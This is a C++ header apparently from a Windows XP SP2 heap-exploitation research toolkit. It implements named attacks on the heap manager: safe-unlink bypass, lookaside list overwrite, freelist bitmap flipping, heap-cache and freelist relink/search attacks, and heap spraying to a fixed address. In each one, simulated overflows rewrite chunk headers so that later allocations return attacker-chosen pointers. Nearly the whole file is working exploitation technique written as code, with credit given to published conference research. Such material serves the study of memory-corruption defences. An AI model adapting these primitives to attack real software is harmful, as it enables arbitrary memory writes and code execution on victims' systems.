/**
 * @file XPHeap.h
 * @author created by: Peter Hlavaty
 * @author created on: 2012/04/10
 */

#ifndef __XPHEAP_H__
#define __XPHEAP_H__

#include "Heap.h"

#pragma pack(push, 1)

struct LOOKASIDE_CHUNK
{
	void* ListHead;
	unsigned short Depth;
	unsigned short MaxDepth;
	ULONG Reserverd1;
	size_t TotalAlloc;
	size_t AllocMiss;
	size_t TotalFrees;
	size_t FreeMiss;
	size_t AllocLastTotal;
	size_t LastAllocateMiss;
	CHAR Reserverd2[12];
};

#pragma pack(pop)

class CXPHeap : public CHeap
{
	#define FREELIST_BITMAP		0x158
	#define FRONT_END			0x580
	#define FREE_LIST			0x178

	#define SPRAY_FLINK			((LIST_ENTRY*)(SPRAY_ADDR + offsetof(HEAP_ENTRY, Links)))
	#define SPRAY_NEXT_FLINK(i)	((LIST_ENTRY*)((ULONG_PTR)SPRAY_FLINK + sizeof(HEAP_ENTRY) * (i)))

public:
	CXPHeap()
	{
		memset(&m_lookaside, NULL, sizeof(m_lookaside));
	}

	~CXPHeap()
	{
		for (int n = 0; n < 0x80; n++)
			for (int i = 0; i < 0x4; i++)
				if (NULL != m_lookaside[n][i])
					HeapFree(m_heap, 0, m_lookaside[n][i]);
	}

	void LFHTest()
	{
		#define SIZE 100

		#define LOOKASIDE_OVER_LIMIT (0x4 + 1)
		#define LOKASSIDE_TESTS (0x4)
		#define LOOKASIDE_TEST_LOOP_COUNTER (LOKASSIDE_TESTS * LOOKASIDE_OVER_LIMIT)

		printf("sizeof lookaside chunk : %x; sizeof freelist chunk : %x", sizeof(LOOKASIDE_CHUNK), sizeof(HEAP_ENTRY));
		
		void* blocks[LOOKASIDE_TEST_LOOP_COUNTER];
		printf("allocations : \r\n");
		for (int i = 0; i < LOOKASIDE_TEST_LOOP_COUNTER; i++)
		{
			size_t size = (SIZE + (i % LOOKASIDE_OVER_LIMIT));
			blocks[i] = Alloc(size);
			//epic fail ?
			if (NULL == blocks[i])
				return;

			printf("%i : %x (%x)\n", i, (ULONG_PTR)(blocks[i]), size);
		}

		printf("\r\nfree list filled\r\n");

		FillLookAside(SIZE + 1);
		FillLookAside(SIZE + 2);

		printf("\r\nlookaside filled\r\n");
		
		
		for (int i = 0; i < LOOKASIDE_TEST_LOOP_COUNTER; i++)
			Free(blocks[i]);

		printf("\r\nfree list freed\r\n\r\n");

		for (int i = 0; i < LOOKASIDE_TEST_LOOP_COUNTER; i++)
		{
			size_t size = (SIZE + (i % LOOKASIDE_OVER_LIMIT));
			printf("realloc : %i : %x; (%x) \r\n", i, (ULONG_PTR)Alloc(size), size);
		}
	}


//LFH exploitation : 


	//XPSP2 Heap Exploitation {Original CanSecWest 04 Presentation: Matt Conover & Oded Horovitz}
	__checkReturn bool SafeUnlinkAttack(__in byte n, __in const void* heapAddr)
	{
		ULONG_PTR blink2self_chunk;
		ULONG_PTR blink2prev_chunk;
		if (!GetPtrToBlinksAround(n, &blink2self_chunk, &blink2prev_chunk))
			return false;

//--- exploit safe unlinking ---
		if (!PopulateFreeList(n))
			return false;

		void* chunk;
//exploit it!
		CHECK_ALLOC_RETB(chunk, n);
		FillLookAside(n);		//block to safe chunk on lookaside!

//simulate overflow :
		Free(chunk);			//unlik from freelist
		OverwriteChunkHeader(GetChunk(chunk), n + 1, (void*)blink2self_chunk, (void*)blink2prev_chunk);

		EmptyLookAside(n);			//avoid get allocation from lookaside!
		CHECK_ALLOC_RETB(chunk, n);	//proceded 'safe' unlinking -> relink to freelist[n-1]
		CHECK_ALLOC_RETB(chunk, n);	//== &freelist[n - 1].Blink

		printf ("*Heap owned* &freelist[n - 1].Blink = %x", (ULONG_PTR)chunk);

		OverwriteChunkHeader((HEAP_ENTRY*)chunk, n + 1, heapAddr);

		return true;
	}

	//XPSP2 Heap Exploitation {Original CanSecWest 04 Presentation: Matt Conover & Oded Horovitz}
	__checkReturn bool LookasideAttack(__in byte n, __in const void* funcPtr)
	{
		void* chunk;

//simulate overflow :
		FillLookAside(n);			//turn on lookaside
		CHECK_ALLOC_RETB(chunk, n);	//get chunk from lookaside
		Free(chunk);				//save it back on lookaside

		OverwriteChunkHeader(GetChunk(chunk), n + 1, funcPtr);

//exploit it!
		CHECK_ALLOC_RETB(chunk, n);	//drop corrupted chunk; == set new chunk[n][0], with flink == funcPtr
		return true;
	}

	//Bitmap Flipping Attack / Bitmap XOR Attack. Moore’s Heaps about Heaps
	__checkReturn bool FreelistBitmapFlipAttack(__in byte n, __in const void* heapAddr)
	{
//--- preprocessing, set appropriate first chunk FreeList[n-1] ---
		void* chunk = NULL;
		while (0 == (0x1000 & (WORD)chunk))	//test flags, 0x10 -> last entry
			chunk = Alloc(n - 1);
		FillLookAside(n - 1);
		Free(chunk); //put it into freelist[n-1] ==> (chunk*)(freelist[n] - offsetof(FREELIST_CHUNK, Links))->flags | 0x10 => last entry

//--- exploiting freelist bitmap ---
		
//mem_write_instruction [r32] ?? :)
		//if (!SetFreelistBitmapBit(n))
		//	return false;

//or heap manager, can do it for us ;)
		if (!PopulateFreeList(n + 1))	//drop 1chunk to freelist
			return false;
		CHECK_ALLOC_RETB(chunk, n + 1); //got it		

		FillLookAside(n + 1);
		Free(chunk);

//simulate overflow
		OverwriteChunkHeader(GetChunk(chunk), n + 1);
		EmptyLookAside(n + 1);

//exploit it!
		CHECK_ALLOC_RETB(chunk, n + 1);	//drop from free list; bitmap flip!; xor very bad idea  => == SetFreelistBitmapBit(n)

		CHECK_ALLOC_RETB(chunk, n); //get &freelist[n]
		OverwriteChunkHeader(GetChunk(chunk), n + 1, heapAddr, heapAddr);//next allocation return our pointer!!

		return true;
	}



//BackEnd exploitation :

	__checkReturn bool HeapCachePointerAttack(__in short n)
	{
		if (!ActivateHeapCache())
			return false;

		if (!PopulateFreeList(n - FREELIST0_DELTA, 4))
			return false;

		void* big_chunk;
		CHECK_ALLOC_RETB(big_chunk, n);	//get ptr to chunk to be overwritten!!
		Free(big_chunk);

		OverwriteChunkHeader(GetChunk(big_chunk), (n + 1) & (~FREELIST0_DELTA));

		return true;
	}

	__checkReturn bool HeapCacheInsertAttack(__in short n, __in byte ln, __in const void* ptrAddress, __in const void* funcPtr)
	{
		void* chunk;
		//get chunk, smaller than our choosen corrupted chunk, but still big enough to fit between it & first smaller chunk
		CHECK_ALLOC_COALESCING_RETB(chunk, (n & (~FREELIST0_DELTA)) - 1);

//exploit it! 1.
		HeapCachePointerAttack(n);

		void* big_chunk;
		CHECK_ALLOC_RETB(big_chunk, (n & (~FREELIST0_DELTA)) - 1);	//unlink from freelist[0], stay linked in heapcache!!

//exploit it! 2.
		OverwriteChunkHeader(GetChunk(big_chunk), (n & (~FREELIST0_DELTA)), funcPtr, ptrAddress);
		Free(chunk);
		//CHECK_ALLOC_RETB(chunk, (n & (~FREELIST0_DELTA)) - 1); //pop first entry, next allocation will be *funcPtr !!

		return true;
	}

	__checkReturn bool HeapCacheEntryFreelistAttack(__in short n, __in const void* ptrAddress)
	{
		if (!ActivateHeapCache())
			return false;

		void* big_chunk;
		CHECK_ALLOC_COALESCING_RETB(big_chunk, n);	//get ptr to chunk in the middle!!

		if (!PopulateFreeList(n - FREELIST0_DELTA, 3))
			return false;
		
		Free(big_chunk); //push to the list, in the middle!! -> append to same size chunk
		OverwriteChunkHeader(GetChunk(big_chunk), n + 1, ptrAddress);
		//CHECK_ALLOC_RETB(big_chunk, n);

		return true;
	}

	__checkReturn bool FreelistRelinkAtack(__in short n, __in byte ln, __in const void* ptrAddress, __in size_t sz, __in_bcount(sz) const void* data)
	{
		EmptyAviableFreeChunks(ln);

		//get chunk to overflow
		void* big_chunk;
		CHECK_ALLOC_RETB(big_chunk, n);
		Free(big_chunk);

		HEAP_ENTRY own_bchunk;
		OverwriteChunkHeader(&own_bchunk, n, SPRAY_FLINK, ptrAddress);	//set fake chunk, size > relink size (n - ln)
		OverwriteChunkHeader(GetChunk(big_chunk), n + 1, SPRAY_FLINK, SPRAY_FLINK);	//overflow chunk, to point to our fake chunk, size enough to handle our allocation!

		memcpy((byte*)big_chunk + (ln + 1) * HEAP_MIN_PAGE_SIZE + sizeof(LIST_ENTRY), data, sz); //overflowed chunk, we can write our own data to it!!
		
		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(own_bchunk), &own_bchunk, SPRAY_ADDR))
			return false;

		CHECK_ALLOC_RETB(big_chunk, ln); //invoke relink!!

		return true;
	}

	__checkReturn bool FreelistSearchAtack(__in short n)
	{
		EmptyAviableFreeChunks(n);

		if (!PopulateFreeList(0x80, 2)) //our chunk can not be the last!!
			return false;

		void* big_chunk;
		CHECK_ALLOC_RETB(big_chunk, 0x80);

		HEAP_ENTRY own_bchunk;
		OverwriteChunkHeader(&own_bchunk, n + 1, SPRAY_FLINK, SPRAY_FLINK); //set fake chunk, it have to be able handle our next alloc request
		
		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(own_bchunk), &own_bchunk, SPRAY_ADDR))
			return false;

		Free(big_chunk);
		//overflow chunk -> next chunk = fake chunk, resize it to smaller size, which can not handle our request, and force search deeper!! -> to our fake chunk
		OverwriteChunkHeader(GetChunk(big_chunk), n, SPRAY_FLINK);

		return true;
	}


//getters : 
public:
	LOOKASIDE_CHUNK* GetLookAsideList()
	{
		return (LOOKASIDE_CHUNK*)(*(ULONG_PTR*)((ULONG_PTR)m_heap + FRONT_END));
	}
	
	LIST_ENTRY* GetFreeList()
	{
		return (LIST_ENTRY*)((ULONG_PTR)m_heap + FREE_LIST);
	}

//
	static void OverwriteChunkHeader(__inout HEAP_ENTRY* chunk, __in short size, __in_opt const void* flink = NULL, __in_opt const void* blink = NULL)
	{
		memset(chunk, 0xFF, offsetof(HEAP_ENTRY, Links));

		chunk->Size = size;
		chunk->Flags |= 0x1;//busy

		if (NULL != flink)
			chunk->Links.Flink = (LIST_ENTRY*)flink;
		if (NULL != blink)
			chunk->Links.Blink = (LIST_ENTRY*)blink;
	}

	void FillLookAside(__in short n)
	{
		if (n >= 0x80)
			return;

		if (NULL == m_lookaside[n][0])
		{
			for (int i = 0; i < 0x4; i++)
				m_lookaside[n][i] = Alloc(n);
		}

		for (int i = 0; i < 0x4; i++)
			if (NULL != m_lookaside[n][i])
			{
				Free(m_lookaside[n][i]);
				m_lookaside[n][i] = NULL;
			}
	}

	void EmptyLookAside(__in short n)
	{
		if (n >= 0x80)
			return;

		for (int i = 0; i < 0x4; i++)
		{
			if (NULL != m_lookaside[n][i])
				Free(m_lookaside[n][i]);

			m_lookaside[n][i] = Alloc(n);
		}
	}

protected:
//specific:
	ULONG_PTR GetPtrToPrevBlink(__in const void* data)
	{
		return (ULONG_PTR)&GetChunk((void*)(ULONG_PTR)GetChunk(data)->Links.Blink)->Links.Blink;
	}

	__checkReturn bool GetPtrToBlinksAround( byte n, ULONG_PTR* blink2SelfChunk, ULONG_PTR* blink2PrevChunk ) 
	{
		void* chunk;
//--- prepare pointers to exploiting ---

		//get address of FreeList[n - 1]
		if (!PopulateFreeList(n - 1))
			return false;

		CHECK_ALLOC_RETB(chunk, n - 1);	//pop from freelist
		*blink2SelfChunk = GetPtrToPrevBlink(chunk);
		Free(chunk);

		//get free_chunk.Blink.Blink pointer => necessary to get chunk from free list!!
		if (!PopulateFreeList(n))
			return false;

		CHECK_ALLOC_RETB(chunk, n);		//pop it; f/blink set!
		*blink2PrevChunk = GetPtrToPrevBlink(chunk);
		Free(chunk);					//push into freelist, this chunk will be overwriten!!

		return true;
	}

private:
	void* m_lookaside[0x80][0x4];
};

#endif //__XPHEAP_H__

/*

FreeList[0].Relinking()!

#RELINKING :

if (size < 0x80):
	LinkToLFH()

chunk = FreeList[0]
while (chunk.Size < size && chunk.Flink != FreeList[0]):
	chunk = chunk.Flink;

new_chunk.Flink = (chunk);
new_chunk.Blink = chunk.Blink

chunk.Blink.Flink = (new_chunk)
chunk.Blink = (new_chunk)

*/
